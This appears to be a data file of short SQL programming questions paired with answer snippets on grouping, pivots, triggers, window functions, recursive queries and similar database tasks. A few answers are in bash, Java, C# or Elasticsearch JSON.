38224,54067,BigQuery how to group by after flattening a collection of tables over timerange,"SELECT
  COUNT(*) ct
FROM (
  SELECT
    1
  FROM
    ... rest of your query ...
  GROUP BY r.ColumnX
)
"
3699,28523,Calculating previous last purchase price if value is less than 10 SQL,",LastPurchase=(SELECT TOP (1) purchamt AS LastPurchase 
FROM purchase AS p 
WHERE (masterid = m.masterid) 
    AND (purchvendorid <> '')
    AND purchamt >= 10
ORDER BY purchasedate DESC)

,PurchaseDate=(SELECT TOP (1) purchasedate 
FROM purchase AS p 
WHERE (masterid = m.masterid) 
    AND (purchvendorid <> '')
    AND purchamt >= 10
ORDER BY purchasedate DESC)

,PONo=(SELECT TOP 1 do.orderno 
FROM [purchase] p INNER JOIN dealorder do on do.orderid = p.purchasepoid 
WHERE (masterid = m.masterid) 
    AND (purchvendorid <> '')
    AND purchamt >= 10
ORDER BY purchasedate DESC)

,vendor=(SELECT TOP 1 v.vendor 
FROM [purchase] p INNER JOIN vendor v on v.vendorid = p.purchvendorid 
WHERE (masterid = m.masterid) 
    AND (purchvendorid <> '')
    AND purchamt >= 10
ORDER BY purchasedate DESC)
"
25914,6866,order multiple tables according to one column,"select Position
from
(
  select base_layers.position AS Position
  from base_layers

  union

  select selects.position
  from selects

  union

  select subbases.position
  from subbases 
) x
order by Position ASC;
"
21391,56301,Add total column to cross tab pivot query,", [Completed] + [Open] AS Total
"
35534,71678,complex SQL depending on each object insert time?,"select lt.*
from (select lt.*,
             row_number() over (partition by user_id, object_id
                                order by insert_time desc) as seqnum
      from logtable lt
     ) lt
where seqnum = 1 and action = 'stop';
"
33305,986,"MySql On update, select into another table conditionally","DELIMITER $$
CREATE TRIGGER mytrig AFTER UPDATE ON posts_unapp
    FOR EACH ROW
    BEGIN
        IF NEW.Status = 'true' THEN  
            INSERT INTO posts_app VALUES(NEW.id, NEW.title,NEW.body,NEW.url,NEW.user,NEW.country);
        END IF;
    END;
$$
DELIMITER ;
"
5830,39535,How to determine tables size in Oracle,"SELECT DS.TABLESPACE_NAME, SEGMENT_NAME, ROUND(SUM(DS.BYTES) / (1024 * 1024)) AS MB
  FROM DBA_SEGMENTS DS
  WHERE SEGMENT_NAME IN (SELECT TABLE_NAME FROM DBA_TABLES)
 GROUP BY DS.TABLESPACE_NAME,
       SEGMENT_NAME;
"
6846,62156,Oracle performance via SQLDeveloper vs application,"declare
    tmp sys_refcursor;
begin
   my_proc(null, null, null, tmp);
end;
"
30083,31925,"SQL Query for ""almost"" duplicate entries (same values for last 3 columns)","SELECT DISTINCT *
FROM   smtab NATURAL JOIN (
  SELECT   Datetime, Power1, Power8
  FROM     smtab
  GROUP BY Datetime, Power1, Power8
  HAVING   COUNT(*) > 1
) AS t
"
15037,34958,SQL-Server common problem - Retrieve ID just inserted,"select scope_identity()
"
8797,64330,Conditional INSERT INTO statement in postgres,"insert into LeadCustomer (Firstname, Surname, BillingAddress, email)
select 
    'John', 'Smith', 
    '6 Brewery close, Buxton, Norfolk', 'cmp.testing@example.com'
where not exists (
    select * from leadcustomer where firstname = 'John' and surname = 'Smith'
);
"
6857,31688,How do I Compute an Order Line Number in SQL 2000,"select 
    ol1.orderId,
    ol1.orderLineId,
    count(*) as lineNumber
from 
    orderLine ol1
    inner join orderLine ol2 
    	on ol1.orderId = ol2.orderId
    	and ol1.orderLineId >= ol2.orderLineId
group by 
    ol1.orderId, 
    ol1.orderLineId
"
15783,72047,SQL: Update column with with an index that resets if column changes,"select
    Id, 
    Type, 
    row_number() over(partition by Type order by Id) as [Order]
from YourTable
"
30132,28023,"How to concatenate variable in Oracle like dot ""."" function in php","'Target Tahun '||thn
"
36585,21077,How to remove duplicate records from the table,"SQL> WITH DATA AS(
  2  SELECT 'apple' a,   'flavour' b FROM dual UNION ALL
  3  SELECT 'flavour',   'apple' FROM dual UNION ALL
  4  SELECT 'new',   'flavour' FROM dual UNION ALL
  5  SELECT 'banana',   'fruit' FROM dual
  6  )
  7  SELECT least(a,b) a,
  8    greatest(a,b) b
  9  FROM data
 10  GROUP BY least(a,b),
 11    greatest(a,b)
 12  /

A       B
------- -------
banana  fruit
apple   flavour
flavour new

SQL>
"
27397,51816,How to use ntile without dividing the partition and incrementing each bucket by one,"select DENSE_RANK() over (Order by Col1, Col2...) GroupFlag,
    * 
from MyTable
"
36202,29423,Oracle SQL Developer: sharing configuration via Dropbox,"#!/bin/bash

# share sqldeveloper config via dropbox
# this is for sqldeveloper 1.5.4, change your paths as necessary
# strace or dtruss sqldeveloper to see what config files are accessed

ITEMS=""
o.ide.11.1.1.0.22.49.48/preferences.xml
o.ide.11.1.1.0.22.49.48/settings.xml
o.jdeveloper.cvs.11.1.1.0.22.49.48/preferences.xml
o.jdeveloper.subversion.11.1.1.0.22.49.48/preferences.xml
o.jdeveloper.vcs.11.1.1.0.22.49.48/preferences.xml
o.sqldeveloper.11.1.1.59.40/preferences.xml
o.sqldeveloper.11.1.1.59.40/product-preferences.xml
""

INST=~/Library/Application\ Support/SQL\ Developer/system1.5.4.59.40
DROP=~/Dropbox/Library/SQL\ Developer/system1.5.4.59.40

# note, you can zap your configuration if you are not careful.
# remove these exit lines when you're sure you understand what's
# going on.

exit

# copy from real folder to dropbox
for i in $ITEMS; do
    echo uncomment to do this once to bootstrap your dropbox
    #mkdir -p ""`dirname ""$DROP/$i"":`""
    #cp -p ""$INST/$i"" ""$DROP/$i""
done

exit

# link from dropbox to real folder
for i in $ITEMS; do
    rm ""$INST/$i""
    ln -s ""$DROP/$i"" ""$INST/$i""
done
"
68,12999,Insert from same table with certain value,"INSERT INTO table_name(id, meta_key, meta_value)
SELECT
    id,
   'salutation' AS meta_key,
    CASE WHEN meta_value = 'male' THEN 'Hello Mr.'
         ELSE 'Hello Mrs.'
    END AS meta_value
FROM table_name
WHERE meta_key = 'gender';
"
9813,25990,If row exist in a table then use another tables value in SQL,"select SUM(coalesce(dp.price, d.price)), o.* 
from orders o JOIN deals d ON d.ID = o.deal_id
              LEFT JOIN order_products op on op.order_id = o.id
              LEFT JOIN deal_products dp on op.product_id = dp.product_id
where o.user_id = 2002 and o.cancelled = 1
group by ...;
"
8773,16943,Update with a complex Select Query,"Update FilesTransmitted t
   set Accepted = 1
 where t.uid = (select max(f.UID)
                  from FilesTransmitted f
                  join FilesReturned r
                    on f.DocumentNumber = r.[Document #]
                   and f.REV = r.REV
                 where r.CODE is null
                   and f.DocumentNumber = t.DocumentNumber
                   and f.rev = t.rev
                 group by f.DocumentNumber, f.REV);
"
22193,56344,Subtract 2 rows in Oracle,"SELECT MAX(DateTime) - MIN(DateTime),No FROM table
GROUP BY No
"
14018,35822,Reuse identity value after deleting rows,"DBCC CHECKIDENT (orders, RESEED, 999)
"
1658,703,get previous row id using stored procedure,"select max(ID) from YourTable where ID < @YourID
"
15992,72118,SQL Developer pivot with unknown number of values into one column,"select *
from
(
  select id, name, country, state, ""DATE"", amount,
    case 
      when type in ('Red', 'Blue', 'Black') then type
      else 'Other' end type
  from yt
) 
pivot
(
  sum(amount)
  for type in ('Red', 'Blue', 'Black', 'Other')
);
"
7804,37110,Selecting multiple rows with a sub-query,"SELECT name, job 
    FROM Employer 
    WHERE job in (SELECT job FROM employer WHERE dept = sales);
"
26035,8404,SQL Server : check boolean can only occur once as true,"CREATE UNIQUE INDEX IX_... ON [Table](bDefault) WHERE bDefault = 1
"
182,55572,Counting likes and comments between two different table of a specific topic,"SELECT posts.id, count(comments.id) + count(likes.id) AS score 
FROM posts
LEFT JOIN comments ON posts.id = comments.post_id 
LEFT JOIN likes ON posts.id = likes.post_id 
GROUP BY posts.id 
ORDER BY score desc;
"
38142,61724,SQL Query where a specific column should have two specific values but have just one,"SELECT
  *
FROM
  Article a
WHERE
  a.`Type` = 1
  AND NOT EXISTS (
    SELECT * FROM
      Article a2
    WHERE
      a2.`Type` = 3
      AND a2.ArticleNumber = a.ArticleNumber
  )
"
36767,14047,Converting Date format to run select statement,"String sqlDate = ""1992-02-16"";
SimpleDateFormat sdfInput = new SimpleDateFormat(""yyyy-MM-dd"");
Date date = sdfInput.parse(sqlDate);
SimpleDateFormat sdfResult = new SimpleDateFormat(""MM-dd-yyyy"");
String result = sdfResult.format(date);
"
24706,50600,How can I change Column Headers title from SQL query datagrid in vb.net,"Select roomnumber As Room_Number, etc
"
29661,40514,MySQL: Sorting rows from 2 (or more) tables by their columns,"SELECT id, name, time
FROM
(
    SELECT book_id id, book_name name, book_time time FROM books
    UNION
    SELECT movie_id id, movie_name name, movie_time time FROM movies
) booksandmovies
ORDER BY time DESC;
"
33400,73506,Oracle auto increment - newbie so go easy please,"CREATE SEQUENCE hotel_bookings_seq 
START WITH 1
INCREMENT BY 1
NOMAXVALUE;

CREATE TRIGGER hotel_bookings_tr
BEFORE INSERT ON hotel_bookings
FOR EACH ROW
BEGIN
    SELECT hotel_bookings_seq.nextval INTO :new.guest_id FROM dual;
END;
/
"
34925,68884,WebSQL selecting child + parent,"SELECT DISTINCT c.*, pc.name as parentName 
FROM Category as c 
LEFT JOIN Category as pc on c.parent_id = pc.id 
WHERE c.building_id = 1 
AND (
  c.parent_id = -1 
  OR (
    c.usingtemplate = 'true'
    AND 
    pc.parent_id = -1
  )
);
"
33127,45172,Select query on temp table without using cursor sql,"With cte as ( Select id,busno,partno,dateadded,
              Row_Number() over( partition by partno order by dateadded desc ) as seqNum
              from Partused
             )

select id,busno,partno,dateadded
from cte
where seqNum=1
"
26079,1798,Why is this Joomla query so slow?,"(race_date, state, sub_event, race_name)
"
460,19690,Convert VARCHAR2 into Number,"SELECT NUMTODSINTERVAL (SUM (total_secs), 'second')
  FROM (SELECT   SUBSTR (duration, 1, 2) * 3600
               + SUBSTR (duration, 4, 2) * 60
               + SUBSTR (duration, 7, 2) total_secs
          FROM user_tab);
"
457,27865,SQL join conditions,"SELECT ch.name,
       SUM(CASE WHEN c.color = 'orange' AND cl.color = 'black' AND c.birthday = 'February' THEN 1 ELSE 0 END) AS OrangeCatsBlackCollarsFeb,
       SUM(CASE WHEN c.color = 'orange' AND cl.color = 'blue' THEN 1 ELSE 0 END) AS OrangeCatsBlueCollars 
    FROM cat_herders ch
        LEFT JOIN cats c
            INNER JOIN collars cl
                ON c.id = cl.cat_id
            ON ch.id = c.cat_herder_id
    WHERE ch.height > 1 /* in meters */
    GROUP BY ch.name
"
20715,19920,"Validate dates before conversion, aka. ISDATE() equivalent","SELECT
 XMLCAST(XMLQUERY('string($D) castable as xs:date' PASSING mycolumn as D ) AS INT)
FROM 
 mytable
"
6786,2797,Find 3 item association rules in SQL Server,"select
    T1.PRODUCTID AS PRODUCTID1,
    T2.PRODUCTID AS PRODUCTID2,
    T3.PRODUCTID AS PRODUCTID3,
    COUNT(DISTINCT T1.ORDERID) AS SUPPORT
FROM transactions T1
JOIN transactions T2 ON T2.PRODUCTID > T1.PRODUCTID AND T2.ORDERID = T1.ORDERID
JOIN transactions T3 ON T3.PRODUCTID > T1.PRODUCTID AND T3.PRODUCTID > T2.PRODUCTID AND T3.ORDERID = T1.ORDERID
GROUP BY T1.PRODUCTID, T2.PRODUCTID, T3.PRODUCTID
"
20358,7200,Help required with a complex self join sql query,"select x.*
from mytable x left outer join
    (   select mt1.a, mt1.b
        from mytable mt1 inner join
            mytable mt2 on mt1.d = mt2.d
        where ((mt1.E ='Y' AND (mt2.E ='N' OR mt2.E IS NULL)) OR (mt2.E='Y' AND (mt1.E='N' OR mt1.E IS NULL)))
    ) y on x.a = y.a and x.b = y.b
where y.a is NULL
"
17185,72310,SQL query to create ascending values within groups,"update the_table
   set pos = t.rn - 1
from (
   select id, 
          row_number() over (partition by fk_id) as rn
   from the_table
) t
where t.id = the_table.id;
"
13336,23313,using scalar function output in an update,"Update YourTable
SET value = dbo.foo(arg)
"
23834,49902,Delete where email is not a known email client,"SELECT *
FROM `users`
WHERE email NOT LIKE '%hotmail.com%'
AND email NOT LIKE '%gmail.com%'
AND email NOT LIKE '%ymail.com%'
"
807,12785,Joining separate columns from one table in SELECT statement,"SELECT playerName, n.nationality, p.country
FROM tbl_Soccer_Player
JOIN tbl_nationality as n ON tbl_Soccer_Player.nationalityID = n.nationalityID
JOIN tbl_nationality as p ON tbl_Soccer_Player.playsForID = p.nationalityID
"
7081,42731,SQL Pivot return all rows on table join even if no record exists (cross join?),"                      dbo.KPIDatas AS t0 RIGHT OUTER JOIN
"
31132,75609,Formatting varchar data into a certain format,"SUBSTRING(thestring, 1, 3) + '/' + SUBSTRING(thestring, 4, 6) + '/' + ...
"
14590,47046,How to trim all columns in all rows in all tables of type string?,"SET SERVEROUTPUT ON

BEGIN
  FOR c IN
    (SELECT t.table_name, c.column_name
       FROM user_tables t, user_tab_columns c
       WHERE c.table_name = t.table_name
         AND data_type='VARCHAR2')
  LOOP

    dbms_output.put_line(
                      'UPDATE '||c.table_name||
                      ' SET '||c.column_name||' = TRIM('||c.column_name||') WHERE '||
                      c.column_name||' <> TRIM('||c.column_name||') OR ('||
                      c.column_name||' IS NOT NULL AND TRIM('||c.column_name||') IS NULL)'
                     );
  END LOOP;
END;
"
11771,52170,oracle pass list of string as parameter,"String query_tr = "" SELECT * "";
       query_tr += "" FROM Transfers TRANSFERS "";
       query_tr +="" LEFT OUTER JOIN correspondence_copy CORRESPCPY on CORRESPCPY.ID_COPY = TRANSFERS.ID_COPY  "" ;
       query_tr +="" WHERE TRANSFERS.ORDERNBR in (:list)"";

SQLQuery sqlQuery = this.getSession().createSQLQuery(query_tr);
sqlQuery.setParameterList(""list"", listOrderNumber)
"
9096,11773,"Find records with a single common field, but different values for other fields","SELECT DISTINCT p.*
FROM Promotions p 
    JOIN Promotions q ON p.promoid = q.promoid AND p.id <> q.id
WHERE (p.customerId <> q.customerId) 
    OR (p.dealPeriod <> q.dealPeriod) 
    OR (p.lob <> q.lob)
"
34822,63766,"Having to insert a record, then update the same record warrants 1:1 relationship design?","CREATE TRIGGER after_insert_lines AFTER INSERT ON lines FOR EACH ROW
  UPDATE orders SET total_cost = total_cost + NEW.price;

CREATE TRIGGER after_update_lines AFTER UPDATE ON lines FOR EACH ROW
  UPDATE orders SET total_cost = total_cost - OLD.price + NEW.price;

CREATE TRIGGER after_delete_lines AFTER DELETE ON lines FOR EACH ROW
  UPDATE orders SET total_cost = total_cost - OLD.price;
"
31026,51710,Using the result of a statement in another,"select a.Fleet, (Operating / Delay ) as Calculated_Col
from (select Fleet, SUM(hours) as Operating 
      from table
      where colE = 'Operating' 
      and START_TIME >= '2012-01-01'
      and END_TIME<='2013-01-01' 
      and FLEET IS NOT NULL
      group by fleet) a
join (select Fleet, SUM(hours) as Delay
      from table
      where colE='Delay'
      and START_TIME>='2012-01-01'
      and END_TIME<='2013-01-01'
      and FLEET IS NOT NULL
      group by fleet) b 
      on a.fleet = b.fleet
order by a.FLEET asc  
"
22627,53081,Doing calculation on SQL count() value,"SELECT InShelf, free - InShelf
FROM (
    SELECT count(*) AS Inshelf, free
    FROM stockproduct
    WHERE StockNum = 1 AND checkOutData IS NULL
    GROUP BY somefield
) AS a
"
39747,58756,How do I cast a type to a bigint in MySQL?,"SELECT CAST(CONV('55244A5562C5566354',16,10) AS UNSIGNED INTEGER);
"
19506,34353,To display count using SQL Server stored procedure,"SELECT COUNT(IndentID) AS OpenedIndent 
FROM Indent I 
WHERE POStatusID IN (1,2) 
GROUP BY I.LocationID
"
31933,45374,Max attempts count,"SELECT
  Emp_Id,
  CASE WHEN MAX(Value)>0 THEN COUNT(*) ELSE 0 END Attempt_Count
FROM
  tablename
GROUP BY
  Emp_Id
"
27830,41338,Joining tables and selecting foreign key where all rows meet condition in first table,"select distinct rc.father
    from accounts a 
    join rel_accounts rc on a.id=rc.father
where a.deleted=0 
      and rc.father not in 
     (select qrc.father
             from accounts qa 
             join rel_accounts qrc on qa.id=qrc.father
      where qa.deleted=0 
            and qrc.son in 
           (select qracc.son
                   from rel_accounts qracc 
                   join accounts qacc on qracc.son=qacc.id
                   where qacc.deleted=0))
order by father desc
"
31798,13667,Remote Database access,"ANDROID -> SERVER-SIDE-SERVICE -> DATABASE
DATABASE -> SERVER-SIDE-SERVICE -> ANDROID
"
14203,30577,Removing duplicate returns from a sql query with a one-to-many relationship,"WITH CTE AS
(   SELECT  w.WishlistID, p.*,
            ImageFile = ISNULL(i.ImageFile, 'na.jpg'),
            ImageNumber = ROW_NUMBER() OVER(PARTITION BY w.WishListID ORDER BY NEWID())
    FROM    Products p
            INNER JOIN Wishlist w 
                ON w.UserID = 4 
                AND w.ProductID = p.ProductID
            LEFT JOIN Link_ProductImage lpi 
                ON lpi.ProductID = p.ProductID
            LEFT JOIN Images i 
                ON i.ImageID = lpi.ImageID
)
SELECT  *
FROM    CTE 
WHERE   ImageNumber = 1;
"
20984,8436,SQL find rows in groups where a column has a null and a non-null value,"SELECT ID, YEAR, PROD, STA, [DATE]
FROM (
  SELECT ID, YEAR, PROD, STA, [DATE],
         COUNT(IIF([DATE] IS NULL, 1, NULL)) OVER 
              (PARTITION BY ID, YEAR, PROD, STA) AS cnt_nulls,
         COUNT(IIF([DATE] IS NOT NULL, 1, NULL)) OVER
               (PARTITION BY ID, YEAR, PROD, STA) AS cnt_not_nulls
  FROM mytable) AS t
WHERE t.cnt_nulls > 0 AND t.cnt_not_nulls > 0
"
7146,64229,Oracle object dependency loop,"create or replace package my_types is
   type type1 is table of number;
   type type2 is table of my_view%rowtype;
end;
/

create or replace package my_utils is
   function get_1 return number;
   procedure do_something(parameter my_types.type2);
end;
/

create or replace package body my_utils is
   function get_1 return number is
   begin
       return 1;
   end;

   procedure do_something(parameter my_types.type2) is
   begin
       null;
   end;
end;
/

create or replace force view my_view as
select * from dual;

exec dbms_utility.compile_schema(user, false);

create or replace force view my_view as
select * from dual
where 1 = my_utils.get_1();

select object_name from user_objects where status <> 'VALID';
"
20678,62010,Count distinct attribute values based on two other columns in SQL,"SELECT SaleItem AS 'Item Sold', 
       SaleDay AS 'Item Sell Day', 
       COUNT(SaleItem) AS 'Number'
FROM Sales
GROUP BY SaleDay, SaleItem
"
26659,69496,Need advice on the best way to filter text files based on a reference table,"HashSet dbData = GetDataFromDB();
foreach(filename in filenames) {
    FileHandle handle = OpenRead(filename);
    FileHandle tmphandle = OpenWrite(filename + "".tmp"");
    while(string line = handle.ReadLine()) {
        if(!dbData.Contains(line)) {
            tmphandle.Write(line);
        }
    }
    tmphandle.Flush();
    tmphandle.Close();
    handle.Close();
    Delete(filename);
    Rename(tmpfilename, filename);
}
"
35021,22299,DISTINCT for only one Column and other column random?,"    SELECT CASE WHEN RN > 1 THEN NULL ELSE Col1 END,Col2
    FROM
    (
    SELECT *,Row_Number() Over(Partition by col1 order by col1) AS RN
    From yourTable
    ) AS T
"
20712,662,How to cross join using 3 tables?,"SELECT c.Nama AS Customer, b.No AS No_Barang, d.Qty
FROM customer c
JOIN barang b
LEFT JOIN det_barang d ON c.No = d.No_Cust AND b.No = d.No_Barang
ORDER BY c.No, b.No
"
28342,71083,how do you use like not expression more than once in one column in sql neat and simple?,"SELECT *
FROM   YourTable
WHERE  col_Name IS NOT NULL AND
           NOT EXISTS (SELECT *
                       FROM   (VALUES ('abc'),
                                      ('cap'),
                                      ('tis'),
                                      ('sat'),
                                      ('plk')) V(C)
                       WHERE  col_Name LIKE '%' + C + '%') 
"
38433,65898,Execute a Stored Procedure with different missing parameter calls,"exec [dbo].[insertIntoTableX] @column_3 = 3, @column_5 = 5;
"
6311,11869,Oracle hierachial query to select only the root parents,"select id, name, parent
from test_data td
where not exists (select 1
                  from test_data td2
                  where td.parent = td2.id
                 );
"
29465,74108,Have result that match condition first,"{
  ""query"": {
    ""match"": {
      ""city"": ""milan""
    }
  },
  ""sort"": [
    {
      ""_script"": {
        ""script"": ""if(doc['band'].value == 'pearl') {10} else {0}"",
        ""type"": ""number"",
        ""order"": ""desc""
      }
    },
    {
      ""relevance"": {
        ""order"": ""desc""
      }
    }
  ]
}
"
8781,47230,Remove the 00:00:00.000 from a sales query MYSQL,"SELECT DATE(SALES_DATE) FROM SALES
WHERE DATE(SALES_DATE) 
BETWEEN '2013-11-02' AND '2013-12-01'
"
9985,31757,How can we use both sql and oracle database connection using one object only,"    DataSet GetDataSet(string sqlQuery, ConnectionType connType)
    {
        DataSet dataset = new DataSet(""aDataSet"");
        using (DataTable table = dataset.Tables.Add(""aDataTable""))
        {
            switch (connType)
            {
                case ConnectionType.MSSQL:
                    using (var conn = new SqlConnection(""Data Source=(local);Initial Catalog=myDb;User Id=user;Password=pw""))
                    {
                        using (var cmd = new SqlCommand(sqlQuery, conn))
                        {
                            conn.Open();
                            using (var reader = cmd.ExecuteReader())
                            {
                                table.Load(reader);
                            }
                        }
                    }
                    break;
                case ConnectionType.Oracle:
                    using (var conn = new OracleConnection(""Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.2.175)(PORT=1521)))(CONNECT_DATA=(SERVER=DEDICATED)(SERVICE_NAME=SCDB)));User Id=user;Password=pw""))
                    {
                        using (var cmd = new OracleCommand(sqlQuery, conn))
                        {
                            conn.Open();
                            using (var reader = cmd.ExecuteReader())
                            {
                                table.Load(reader);
                            }
                        }
                    }
                    break;
                default:
                    break;
            }
        }
        return dataset;
    }

    enum ConnectionType { MSSQL, Oracle }
"
14282,72076,MySQL - exclude all blocked users from the results,"select * from users where user_id <> 4 and language = 'en'
    and user_id not in(select blocked_user_id from users_blocked where user_id = 4)
    and user_id not in(select user_id from users_blocked where blocked_user_id = 4)
"
28542,21261,remove duplicates in column TSQL,"select
    Year, AccountName, case when rownum=1 then Certs else '' end as Certs, MoreCerts
from (
    select *, row_number() over (partition by Certs order by MoreCerts) [rownum]
    from your_table
) x
order by x.Certs, rownum
"
17529,28340,Any way to get 95th percentile and sum in the same query?,"SELECT
    SUBSTRING_INDEX(
            SUBSTRING_INDEX(
                GROUP_CONCAT( 
                    t.inbound
                    ORDER BY t.inbound
                    SEPARATOR ','
                )
            ,   ','
            ,   95/100 * COUNT(*) + 1
            )
        ,   ','  
        ,   -1  
        )                 AS `Inbound95`
    ,
    SUBSTRING_INDEX(
            SUBSTRING_INDEX(
                GROUP_CONCAT(  
                    t.outbound
                    ORDER BY t.outbound
                    SEPARATOR ','
                )
            ,   ','         
            ,   95/100 * COUNT(*) + 1 
            )
        ,   ','                       
        ,   -1                          
        )                 AS `Outbound95`
FROM   traffic AS t WHERE t.server_id = 1
"
32847,51393,Extract the year out of a Date and compare it in the same query,"SELECT Login FROM LeaveRequest 
WHERE StartDateYear = year(convert(date,'2015-11-18',111))
  AND EndDateYear = year(convert(date,'2015-11-18',111))
  AND Type = typeid
"
24124,67710,Query to analyze log-in data and intelligently identify a shift worked,"select t1.username, t1.end_dt_tm beforeBreak, t2.start_dt_tm afterBreak, t2.start_dt_tm - t1.end_dt_tm as diff 
from user_activity t1, user_activity t2
where t1.username = t2.username and t2.start_dt_tm = 
(
  select min(nxt.start_dt_tm) from user_activity nxt 
  where nxt.username = t1.username and nxt.start_dt_tm > t1.end_dt_tm
)
;
"
12572,48980,How to write a query for fetching from two table in a single field,"SELECT video_title FROM video_master
UNION ALL
SELECT audio_title FROM audio_master
"
3893,37886,SQL Server : format 700 as time,"select stuff(right('0' + replace([StartTime], ':', ''), 4), 3, 0, ':'),
       stuff(right('0' + replace([EndTime], ':', ''), 4), 3, 0, ':')
from [tblRota]
"
9847,25390,SQL nested Select....I think?,"WHERE up.[Stops] > 0
"
3536,70118,Optimize time of execution of PSQL query,"select tp.id as tpid, 
       max(tp.name) as desc, 
       count(*) as count, 
       max(t.date) as date
from topicparam tp
  join topic t on t.topicparam_id = tp.id
group by tp.id;
"
13755,37616,apply best fitted discount package on items automatically,"-- Test tables
CREATE TABLE #Package(Name varchar(50), Discount decimal(10,2))
CREATE TABLE #PackageItem(PackageName varchar(50), ProductName varchar(50))
CREATE TABLE #ShoppingCart(ProductName varchar(50))

-- Test data
INSERT INTO #Package VALUES ('Package1', 0.05)
INSERT INTO #PackageItem VALUES ('Package1', 'Item1')
INSERT INTO #PackageItem VALUES ('Package1', 'Item2')
INSERT INTO #PackageItem VALUES ('Package1', 'Item5')
INSERT INTO #Package VALUES ('Package2', 0.08)
INSERT INTO #PackageItem VALUES ('Package2', 'Item1')
INSERT INTO #PackageItem VALUES ('Package2', 'Item5')
INSERT INTO #PackageItem VALUES ('Package2', 'Item8')
INSERT INTO #Package VALUES ('Package3', 0.03)
INSERT INTO #PackageItem VALUES ('Package3', 'Item1')
INSERT INTO #PackageItem VALUES ('Package3', 'Item2')

INSERT INTO #ShoppingCart VALUES ('Item1')
INSERT INTO #ShoppingCart VALUES ('Item2')
INSERT INTO #ShoppingCart VALUES ('Item5')
INSERT INTO #ShoppingCart VALUES ('Item10')

SELECT  TOP 1 *
FROM    (
    -- Join #ShoppingCart with PackageItem and count matched rows
    SELECT      #Package.Name, #Package.Discount,
                COUNT(#Package.Name) AS [Count]
    FROM        #ShoppingCart
    LEFT JOIN   #PackageItem 
                ON #PackageItem.ProductName = #ShoppingCart.ProductName
    LEFT JOIN   #Package ON #Package.Name = #PackageItem.PackageName
    GROUP BY    #Package.Name, #Package.Discount
        ) A
JOIN
        (
    -- Count how many products each package have
    SELECT      #Package.Name,
                COUNT(#Package.Name) AS [Count]
    FROM        #Package
    LEFT JOIN   #PackageItem ON #Package.Name = #PackageItem.PackageName
    GROUP BY    #Package.Name, #Package.Discount
        ) B
-- if same package contains same number of products, pick it
-- (so you can't have a same item twice in your cart;
--  but you probably already have a quantity column)
ON A.Name = B.Name AND A.[Count] = B.[Count]
-- just greater discount matters
ORDER BY A.Discount DESC

-- Clear test stuff
DROP TABLE #Package
DROP TABLE #PackageItem
DROP TABLE #ShoppingCart
"
23440,50969,Select latest values for group of related records,"select distinct on (relation_id, code) t.*
from t
order by relation_id, code, date desc;
"
5825,42502,Is a date in Oracle-SQL without a time-value always 00:00:00?,"Trunc(to_date('16.07.2010', 'dd.MM.YYYY')) and 
Trunc(to_date('20.07.2010', 'dd.MM.YYYY'))
"
28278,41420,MySql - Inserting multiple rows with a joined subquery?,"INSERT INTO `subscrips` 
SELECT 37, id 
  FROM `proj_objects` 
 WHERE type = 'fthread'
"
22335,63946,How to get output like SQLPLUS while Running SQL Query in shell script,"echo ""$RETVAL""
"
38879,71708,Setting SQL Relationships For LINQ Queries,"var firstQuery = (for w in Widgets
                  join o in Orders
                  on w.WidgetId equals o.WidgetID
                  select new {Widgets = w, OrderDate = o.OrderDate}).Distinct();

var secondQuery = for record in firstQuery
                  where record.OrderDate == ""5/11/2010""
                  select record.Widgets;
"
7641,51749,MySQL change database with variable value,"set @schema=""testDB"";
set @front=""CREATE TABLE IF NOT EXISTS "";
set @endpart="".`TEST1` (DIM_ID INT(16)) ENGINE = InnoDB DEFAULT CHARACTER SET = utf8 COLLATE = utf8_unicode_ci;"";
set @stat=concat(@front,@schema,@endpart);
prepare command from @stat;
execute command;
"
9593,35007,Cascade Updates with Math in SQL,"SELECT (SELECT COUNT(*) FROM table_name AS p2 WHERE p2.num_pawns + 3*p2.num_knights + 5*num_castles > p1.num_pawns + 3*p2.num_knights + 5*num_castles) FROM table_name AS p1 where p1.rowid=x); where x is a rowid
"
19135,21921,'and' logic in left join match condition,"select t1.*, t2.x 
from t1 
left join t2 on t1.id = t2.id and t1.id=374170417 
"
12928,25560,Update query that will update a column that is generated recursivley,"with recursive cat_tree (id, parent_id, name, full_path) as (
   select id,parent_id,name, '/'||name as full_path
   from categories
   where parent_id is null
   union all
   select c.id,c.parent_id,c.name,p.full_path||'/'||c.name
   from categories c
     join cat_tree p on p.id = c.parent_id
)
update categories
  set path = c.full_path
from cat_tree c 
  where c.id = categories.id;
"
779,53214,Regex to match everything between a string and a caret (^) excluding occurrence of caret (^),"(?<=\[StupidHtml\]\:)(.*?)(?=\^)
"
38460,58295,SQL - select selective row multiple times,";WITH recurs AS (
  SELECT *, 1 AS LEVEL
  FROM tblContact
  UNION ALL
  SELECT t1.*, LEVEL + 1
  FROM tblContact t1
  INNER JOIN
  recurs t2
  ON t1.addressnum = t2.addressnum
  AND t2.labelsnum > t2.LEVEL
 )

SELECT *
FROM recurs
ORDER BY addressnum
"
25620,75087,Fetch SQL rows with priority,"SELECT *
FROM   (
  SELECT  t.*,
          ROW_NUMBER() OVER (
            PARTITION BY RID
            ORDER BY CASE
                     WHEN module = LOWER( :mod ) AND tag = UPPER( :tag ) THEN 1
                     WHEN                            tag = UPPER( :tag ) THEN 2
                     WHEN module = LOWER( :mod ) AND tag IS NULL         THEN 3
                     WHEN module IS NULL         AND tag IS NULL         THEN 4
                                                                         ELSE 5
                     END
        ) AS rn
  FROM  translations t
  WHERE ( module IS NULL OR module = LOWER( :mod ) )
  OR    ( tag IS NULL OR tag = UPPER( :tag ) )

)
WHERE  rn = 1;
"
32396,3162,Oracle Order By Sorting: Column Values with character First Followed by number,"order by (case when substr(col, 1, 1) between 'A' and 'Z' then 1 else 2 end),
         (case when substr(col, 2, 1) between 'A' and 'Z' then 1 else 2 end),
         (case when substr(col, 3, 1) between 'A' and 'Z' then 1 else 2 end),
         col
"
16931,3424,Sql Comparison where values of Table1 not found in Table2 and showing result as Table3,"Select Items 
Into Table3
From Table1 
Where Not Exists (Select Items From Table2 Where Table2.Items = Table1.Items) 
"
22822,22339,SQL Update with results from another Table,"with toupdate as (
    SELECT e.Prod_name, e.Prod_number, (SUM(e.Qty) - SUM(g.Qty)) Qty
    FROM Products_Invoices e JOIN (
         SELECT product_number, SUM(qty) Qty
         FROM SoldItemsCalc
         GROUP BY product_number
        ) g ON e.Prod_number = g.product_number
    GROUP BY Prod_number, Prod_name
   )
update t
    set qty = toupdate.qty
    from toupdate
